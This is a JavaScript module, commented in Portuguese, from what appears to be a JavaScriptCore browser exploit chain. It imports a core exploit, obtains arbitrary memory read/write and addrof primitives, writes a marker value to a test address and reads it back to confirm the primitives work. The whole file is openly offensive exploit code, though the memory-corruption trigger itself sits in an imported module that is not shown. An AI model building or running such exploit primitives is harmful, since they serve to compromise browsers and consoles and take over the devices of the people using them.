// js/script3/testArrayBufferVictimCrash.mjs (v102 - Consumidor de Primitivas Robustas)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
// Importa a nova função de setup do core exploit atualizado
import { setupAndGetRobustPrimitives } from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_UPDATED = "RobustPrimitivesConsumer_v102";

// =======================================================================================
// FUNÇÃO DE TESTE PRINCIPAL ATUALIZADA
// =======================================================================================
export async function runRobustnessVerificationTest() {
    const FNAME_TEST = FNAME_MODULE_UPDATED;
    logS3(`--- Iniciando ${FNAME_TEST}: Verificação de Primitivas Robustas ---`, "test");

    let final_result = { success: false, message: "Falha ao obter primitivas robustas." };

    try {
        // --- FASE 1: Obter as primitivas robustas ---
        logS3("--- FASE 1: Obtendo L/E robusta do Core Exploit... ---", "subtest");
        const primitives = await setupAndGetRobustPrimitives();
        if (!primitives || !primitives.arb_read || !primitives.arb_write) {
            throw new Error("O objeto de primitivas retornado é inválido.");
        }
        const { arb_read, arb_write, addrof } = primitives;
        logS3("Primitivas de L/E robustas recebidas.", "good");
        
        if (!addrof) {
            logS3("AVISO: A primitiva 'addrof' não está disponível (devido ao paradoxo do exploit).", "warn");
            logS3("Focando no teste de L/E em um endereço conhecido dentro do nosso controle.", "info");
        }

        // --- FASE 2: Verificação Funcional da L/E Robusta ---
        logS3("--- FASE 2: Verificando L/E robusta em endereço conhecido (OOB Buffer @ 0x400)... ---", "subtest");
        
        const test_addr = new AdvancedInt64(0x400, 0);
        const value_to_write = new AdvancedInt64(0xDEADBEEF, 0xCAFEBABE);
        
        logS3(`Escrevendo ${value_to_write.toString(true)} no endereço de teste ${test_addr.toString(true)}...`, "info");
        arb_write(test_addr, value_to_write);

        const value_read = arb_read(test_addr);
        logS3(`>>>>> VALOR LIDO DE VOLTA: ${value_read.toString(true)} <<<<<`, "leak");

        if (value_read.equals(value_to_write)) {
            logS3("++++++++++++ SUCESSO ROBUSTO! O valor escrito foi lido corretamente com a nova primitiva. ++++++++++++", "vuln");
            final_result = {
                success: true,
                message: "A primitiva de L/E robusta baseada em ArrayBufferView é 100% funcional."
            };
        } else {
            throw new Error(`A verificação de L/E ROBUSTA falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
        }

    } catch (e) {
        final_result.message = `Exceção na verificação de robustez: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_TEST} Concluído ---`, "test");
    return final_result;
}
